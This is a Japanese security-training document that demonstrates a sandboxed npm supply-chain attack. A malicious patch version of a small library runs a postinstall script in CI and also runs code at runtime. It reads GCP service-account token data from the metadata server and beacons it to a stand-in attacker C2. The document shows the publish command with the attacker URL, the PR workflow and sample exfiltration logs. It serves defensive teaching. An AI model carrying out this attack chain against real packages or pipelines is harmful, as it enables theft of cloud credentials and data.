# 攻撃デモ: 悪性依存パッケージによる OSS サプライチェーン攻撃

- [攻撃デモ: 悪性依存パッケージによる OSS サプライチェーン攻撃](#攻撃デモ-悪性依存パッケージによる-oss-サプライチェーン攻撃)
  - [安全に関する前提](#安全に関する前提)
  - [想定するのは公開 OSS への攻撃](#想定するのは公開-oss-への攻撃)
  - [攻撃シナリオ](#攻撃シナリオ)
  - [実環境での攻撃デモ（手順と結果）](#実環境での攻撃デモ手順と結果)
    - [1. 正常時](#1-正常時)
    - [2. 攻撃者が悪性バージョン 1.0.1 を公開（本体リポジトリ）](#2-攻撃者が悪性バージョン-101-を公開本体リポジトリ)
    - [3. Dependabot 相当の依存更新 PR の作成（演習用リポジトリ）](#3-dependabot-相当の依存更新-pr-の作成演習用リポジトリ)
    - [4. マージ前 PR チェック CI によるビルド SA の情報窃取](#4-マージ前-pr-チェック-ci-によるビルド-sa-の情報窃取)
    - [5. マージ・デプロイ後の実行時における実行 SA の情報窃取](#5-マージデプロイ後の実行時における実行-sa-の情報窃取)
    - [6. 復旧（デモ後の片付け）](#6-復旧デモ後の片付け)
    - [攻撃の特徴](#攻撃の特徴)
  - [対策の位置づけ](#対策の位置づけ)
  - [ローカルでのオフライン再現](#ローカルでのオフライン再現)

自作の小規模ライブラリ `expense-format` を題材とし、ロックファイルによってバージョンを固定している場合であっても、依存関係の更新（`npm update` や Dependabot 等）の際に公開直後の悪性バージョンを検証なしに取り込んでしまう攻撃シナリオを扱います。本デモでは、実際の演習パイプライン（GitHub → Cloud Build → Cloud Run）上でこの攻撃を成立させます。

デモの実行環境構成および登場ファイル一覧は [../src/demos/malicious-dependency/](../src/demos/malicious-dependency/)（配下の `gce/`・`local/`）を参照してください。実行環境の構築・破棄手順は事前作業として [../src/demos/malicious-dependency/gce/README.md](../src/demos/malicious-dependency/gce/README.md) に集約し、当日実行するコマンドは各フェーズの手順に組み込んでいます。

## 安全に関する前提
- 悪性コードの挙動は安全性を担保したシミュレーション用の構成です。実際の資格情報窃取や外部への不正送信は行わず、通信宛先はデモ用に構築した攻撃者用受信サーバー（C2）に限定されています。送信されるデータは、機密情報の可能性がある環境変数のキー名と、サービスアカウント（SA）トークンへアクセスできたことを証明する非悪用データ（SA メールアドレス、トークン長、SHA-256 ハッシュ値、接頭辞）のみであり、再利用可能なトークン自体は一切送信されません。
- 公開 npm レジストリ（npmjs.com）へのパブリッシュは一切行いません。演習環境内に構築されたプライベートレジストリ（Verdaccio）内部で処理が完結します。

## 想定するのは公開 OSS への攻撃
現実の OSS サプライチェーン攻撃は、**公開レジストリ上のサードパーティ製パッケージ**に対して悪性バージョンがパブリッシュされるケース（メンテナのアカウント乗っ取り等）が大半を占めます。本デモではこの構図を忠実に再現するため、以下の構成を採用しています。

- Verdaccio を公開 npm（npmjs.com）の代替として使用します（組織内プライベートレジストリを想定するシナリオとは異なります）。実際の公開レジストリへマルウェアを設置することは不可であるため、パブリッシャーと被害者の双方を単一のサンドボックス環境内で再現します。
- 対象パッケージはスコープ未指定の一般的な OSS 形式（`expense-format`）として定義しており、`@org/...` のような組織専用スコープは使用しません。
- 設定により `expense-format` のみをローカルレジストリで処理し、`express` などのその他のパッケージについては Verdaccio が公開 npm レジストリへプロキシするよう構成されています。したがって、デフォルトの参照先を Verdaccio に設定した場合であっても通常の依存関係を正常にインストールでき、悪性バージョンが一般の OSS パッケージと同一のレジストリ上に並ぶ構図を再現します。

本デモにおける重要なポイントは、対象が小規模なユーティリティであっても著名な OSS であっても、セマンティックバージョニング（semver）の許容範囲内で悪意のある新バージョンを取り込んでしまう攻撃メカニズム自体は同一である点です。

## 攻撃シナリオ
対象アプリケーションは `package-lock.json`（lockfile）を Git にコミット済みであり、通常時のビルドは `npm ci` によって lockfile の定義どおり（1.0.0）に実行されます。攻撃はこの完全固定を破る「依存関係の更新」処理に乗じる形で成立します。

1. `expense-format@1.0.0`（正規版）を lockfile で固定した状態で運用しています。
2. 攻撃者が `^1.0.0` の指定範囲内に収まる悪意のある新バージョン `1.0.1` をパブリッシュします。
3. 依存関係の更新（`npm update` や Dependabot による自動 PR 生成等）を実行すると、lockfile 内の定義が `1.0.0` から `1.0.1` へと書き換わります。
4. 更新 PR のマージ前検証 CI が `1.0.1` をインストールした際、`postinstall` スクリプト（インストール時 RCE）が CI ランナー上で実行されます。これにより、人手によるコードレビューが行われる前に CI 環境の侵害が完了します。
5. PR マージ後のビルド・デプロイパイプラインを経て、実行環境（Cloud Run）においても継続的な情報送信（C2 通信）が発生します。

## 実環境での攻撃デモ（手順と結果）
lockfile によってバージョン `1.0.0` に固定して運用している場合であっても、依存関係の更新処理（Dependabot 等の自動作成 PR）が公開直後の悪性バージョン `1.0.1` を取り込んだ瞬間、ビルド用 SA、続いて実行用 SA の資格情報証明が窃取されます。以下では各段階の内部動作と C2 サーバー側の受信用ログに加え、実際に実行するコマンドを併記し、上から順に実演できるように記述しています。

- **事前準備**: Verdaccio・攻撃者 C2・正規版 1.0.0 のベースラインは事前に構築しておきます（構築・破棄手順は [../src/demos/malicious-dependency/gce/README.md](../src/demos/malicious-dependency/gce/README.md) を参照）。
- **プレースホルダー**: `<IP>`＝Verdaccio、`<attackerIP>`＝C2 サーバー、`<NN>`＝対象の演習環境番号。プロジェクト固有値・ハッシュ値・IP・タイムスタンプは実行環境により変動します。
- **実行場所**: 操作は「攻撃者・運用者側（本体リポジトリで実行）」と「被害者側（演習用リポジトリで実行）」に分かれます。各段階の見出しに実行場所を示します。

### 1. 正常時
frontend は `expense-format@1.0.0`（正規版）を lockfile で固定し、`npm ci` を用いて正常にデプロイされています。金額の整形処理は正しく機能し、攻撃者 C2 サーバーへの通信は一切発生しません。
```text
$ curl -s localhost:8080/api/expenses      # Cloud Run サービスへ proxy 経由でアクセス
[{ "amountText": "￥12,000", ... }]          # 正常なレスポンス
```

### 2. 攻撃者が悪性バージョン 1.0.1 を公開（本体リポジトリ）
攻撃者が `expense-format` のパブリッシュ権限（メンテナ権限）を奪取し、`^1.0.0` の許容範囲内に収まる悪意のあるバージョン `1.0.1` を公開します。既存の金額整形処理（`formatYen`）は維持しつつ、インストール時（`postinstall`）と実行時の双方にデータ送信コードを埋め込み、送信先 C2 サーバーのアドレスを指定します。利用者側からは一般的なマイナーバージョン更新に見えます。
```bash
ATTACKER=http://<attackerIP>:9099/steal REG=http://<IP>:4873/ \
  src/demos/malicious-dependency/gce/publish.sh evil
```
```text
+ expense-format@1.0.1
publish 完了: expense-format@1.0.1 (evil)
```

### 3. Dependabot 相当の依存更新 PR の作成（演習用リポジトリ）

依存関係の更新処理により lockfile 内のバージョン記述が `1.0.0` から `1.0.1` へ書き換わり、更新 PR が自動生成されます（本デモでは Dependabot の命名慣習に倣い、`dependabot/npm_and_yarn/expense-format-1.0.1` ブランチで更新 PR を作成します）。コード差分（diff）には、バージョン番号・integrity ハッシュ値の変化に加え、**`hasInstallScript: true` の追加**が記録されます。これは「この新バージョンはインストール時にスクリプト（`postinstall` 等）を実行する」ことを npm に示すフラグで、`npm install` / `npm ci` はこのフラグを見て install スクリプトを実行します。差分にこのフラグが現れること自体が「取り込むとインストール時にコードが動く」という重要なシグナルであり、精密にレビューできれば攻撃を察知・阻止できますが、セマンティックバージョニングの許容範囲内の小さな差分であるため見落とされるリスクが高くなります。

```bash
( cd frontend && npm update expense-format --registry http://<IP>:4873/ )
git switch -c dependabot/npm_and_yarn/expense-format-1.0.1
git commit -am "chore(deps): bump expense-format from 1.0.0 to 1.0.1"
git push -u origin dependabot/npm_and_yarn/expense-format-1.0.1
gh pr create --fill --base main
```

```diff
   "node_modules/expense-format": {
-    "version": "1.0.0",
-    "resolved": "http://<IP>:4873/expense-format/-/expense-format-1.0.0.tgz",
-    "integrity": "sha512-…AAA…",
+    "version": "1.0.1",
+    "resolved": "http://<IP>:4873/expense-format/-/expense-format-1.0.1.tgz",
+    "integrity": "sha512-…BBB…",
+    "hasInstallScript": true,
     "license": "MIT"
   },
```
> [!IMPORTANT]
> install 時の攻撃を成立させるには、lockfile の `expense-format` エントリに **`hasInstallScript: true` が含まれている必要があります**（npm は本フラグで install スクリプト実行の要否を判断するため、存在しない場合は CI 環境で `postinstall` が実行されません）。フルインストールの `npm update` では自動で記録されますが、`--package-lock-only` や version・integrity のみの手動編集では抜けるため、その場合は手動で追加してください。なお、この `npm update`（フルインストール）は手元環境でも `postinstall` が1回実行され、C2 サーバーへビーコンが送信されます。これを回避したい場合は `npm update expense-format --ignore-scripts`（tarball は取得するため `hasInstallScript` は記録され、ローカル環境では非実行）を使用し、付与後に lockfile へ該当フラグが挿入されたか確認してください。
> `integrity` ハッシュ値は環境（Verdaccio）ごとに異なります。実際の値は `curl -s http://<IP>:4873/expense-format | jq '.versions | to_entries[] | {version: .key, integrity: .value.dist.integrity}'` で確認できます（`npm update` 後の `git diff package-lock.json` でも同一差分を再現可能です）。

### 4. マージ前 PR チェック CI によるビルド SA の情報窃取
更新 PR の作成によってマージ前検証パイプライン（`cloudbuild.pr.yaml`）が起動し、依存関係をインストールして `1.0.1` を導入した時点で、悪意のある `postinstall` スクリプトが CI ランナー上で自動実行されます。npm はデフォルト仕様で `install` スクリプトの標準出力を非表示（実行自体は実施）とするため、ビルドログ上には目立った異常が表示されません。しかし内部では、GCP メタデータサーバー（`169.254.169.254`）へ `Metadata-Flavor: Google` ヘッダを付与してビルド用 SA のアクセストークンを取得し、そのアクセス証明（悪用不可能なハッシュ・接頭辞データ）を C2 サーバーへ送信します（このヘッダ要求はブラウザ等からの単純な SSRF を防ぐための仕組みですが、CI ランナー内で実行される任意コードには制約になりません）。人手によるレビューが行われる前に、CI 検証の段階で環境の侵害が成立します。C2 サーバーでの受信ログを確認します。

```bash
# C2 サーバー（VM）に SSH し、受信コンテナのログを確認（末尾を追従する場合は -f を付与）
gcloud compute ssh attacker-receiver --zone asia-northeast1-b --command 'docker logs attacker-receiver'
```

> `postinstall` の標準出力をビルドログ上にも表示させたい場合は、`cloudbuild.pr.yaml` の `frontend-deps` における npm 実行コマンドに `--foreground-scripts` フラグを付与します（初期状態では未付与）。

> 本デモは、install スクリプトが既定で実行される npm の挙動（npm 11 以前、または `allowScripts` 設定等で許可した環境）を前提としたリスク検証です。npm v12 以降は install スクリプトが既定で無効化されるため、本 install 時の攻撃ベクター自体が既定でブロックされます（第2章「ベンダー・エコシステム側の対応」を参照）。ただし、ライブラリ本体のコードに組み込まれた実行時ベクターに対しては本対策の効果が及ばない点に留意が必要です。

C2 サーバー側で受信される `postinstall` 時のビーコンデータ例:

```jsonc
{
  "n": 1,
  "at": "<ISO日時>",
  "from": "<Cloud Build の egress IP>",
  "data": {
    "stage": "postinstall",
    "cwd": "/workspace/frontend/node_modules/expense-format",
    "secretEnvKeys": ["GOOGLE_CLOUD_PROJECT", "..."],
    "saTokenProof": {
      "sa": "<プロジェクト番号>@cloudbuild.gserviceaccount.com",
      "tokenLen": 833,
      "tokenSha256": "<64桁hex>",
      "tokenPrefix": "ya29.c.…"
    }
  }
}
```

### 5. マージ・デプロイ後の実行時における実行 SA の情報窃取
PR がマージされると、push トリガーによってビルドおよび Artifact Registry への push が実行され、続いて deploy トリガー経由で Cloud Run へ新リビジョンがデプロイされます（初期状態では検証なし）。デプロイされたアプリケーションへアクセスすると、`formatYen` 関数が呼び出されるたびに、今度は実行用 SA（`flowpay-frontend-sa`）のトークンアクセス証明および処理対象の金額データが C2 サーバーへ継続送信されます。アプリケーション自体のレスポンスは正常な状態を維持するため、利用者が異常を察知することは極めて困難です。

```bash
# 別ターミナルで proxy を張り、画面や /api/summary を開くと formatYen が呼ばれる
gcloud run services proxy app-<NN>-frontend --region asia-northeast1 --port 8080
# 受信は SSH で受信コンテナのログを確認
gcloud compute ssh attacker-receiver --zone asia-northeast1-b --command 'docker logs attacker-receiver'
```

```jsonc
{
  "n": 2,
  "at": "<ISO日時>",
  "from": "<Cloud Run の egress IP>",
  "data": {
    "stage": "runtime",
    "event": "formatYen",
    "stolen": 12000,
    "saTokenProof": {
      "sa": "flowpay-frontend-sa@<プロジェクト>.iam.gserviceaccount.com",
      "tokenLen": 964,
      "tokenSha256": "<64桁hex>",
      "tokenPrefix": "ya29.c.…"
    }
  }
}
```

> 送信されるデータはアクセスの証拠（SA メールアドレス、トークン長、SHA-256 ハッシュ、接頭辞）のみであり、再利用可能なアクセストークン自体は送信されません。なおローカル検証版（[../src/demos/malicious-dependency/local/README.md](../src/demos/malicious-dependency/local/README.md)）ではクラウドのメタデータが存在しないため、`saTokenProof` が `null` となる点のみが異なります。npm の install スクリプト無効化（`--ignore-scripts` 等）は install 時のベクター（段階4）には効果を発揮しますが、ライブラリ本体に組み込まれた実行時ベクターには効果を持ちません。

### 6. 復旧（デモ後の片付け）
デモ完了後はベースライン（正規版 1.0.0）へ復元し、悪性版をレジストリから取り下げます。

```bash
# 演習用リポジトリ: PR を閉じてブランチ削除（未マージ）／マージ済みなら lockfile を 1.0.0 に戻して再デプロイ
# 攻撃者側（本体リポジトリ）: レジストリから悪性版を取り下げ
npm unpublish expense-format@1.0.1 --force --registry http://<IP>:4873/
```

### 攻撃の特徴
- アプリケーションは一貫して正常に動作しているように見えます（金額整形処理は正常に機能します）。攻撃者側に不審な動きを検知させないこと自体が、本攻撃の設計上の狙いです。
- 依存関係のインストール処理が CI ランナー上で実行されるため、埋め込まれた悪性コードがクラウドのアイデンティティ（メタデータサーバー）に到達可能です。ビルド時はビルド用 SA、実行時は実行用 SA と、段階に応じて異なる実行権限が標的とされます。
- 侵害はマージ前の PR チェック CI の時点で既に成立します。「コードレビューで違和感に気づけば防げる」という前提は機能せず、未検証の依存パッケージを CI 環境で実行した時点で侵害が発生します。

## 対策の位置づけ
本攻撃で確認した侵入経路は、依存関係の更新操作に乗じて取得時・ビルド時・実行時の複数段階で成立するため、単一の対策のみですべての段階を防ぐことは不可能です。具体的な対策の枠組みと選定の観点は第2章「脅威モデリングと対策」（2-2 対策の枠組みと観点）で、実践課題は第3章の演習で扱います。

## ローカルでのオフライン再現
Google Cloud 環境を構築することなく、`localhost` のみで同様の攻撃シナリオを再現可能なローカル検証版が用意されています。実行手順および出力例の詳細は [../src/demos/malicious-dependency/local/README.md](../src/demos/malicious-dependency/local/README.md) を参照してください。
